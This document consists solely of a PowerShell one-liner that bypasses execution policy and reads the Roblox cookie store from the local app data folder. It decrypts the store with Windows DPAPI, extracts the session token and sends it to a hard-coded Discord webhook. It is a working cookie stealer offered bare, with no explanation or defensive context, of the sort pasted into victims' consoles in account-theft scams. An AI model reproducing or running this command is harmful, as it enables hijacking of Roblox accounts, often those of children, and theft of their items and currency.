powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Security; $p = Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat'; if (Test-Path $p) { $d = Get-Content $p -Raw | ConvertFrom-Json; $b = [Convert]::FromBase64String($d.CookiesData); $t = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($b, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)); $s = $t.IndexOf('_|WARNING:-'); if ($s -ge 0) { $e = $t.IndexOf([Environment]::NewLine, $s); if ($e -eq -1) { $e = $t.Length }; $c = $t.Substring($s, $e - $s); $body = @{ content = 'ROBLOX COOKIE: ' + $c } | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1521858893528170648/0b_SJ7BpeM9V3AWU8CHyDvzM0S0BT161Bgxy3B6xXHC9dVtX00CCT6HOp4NPt-9yFQaQ' -Method Post -ContentType 'application/json' -Body $body } }"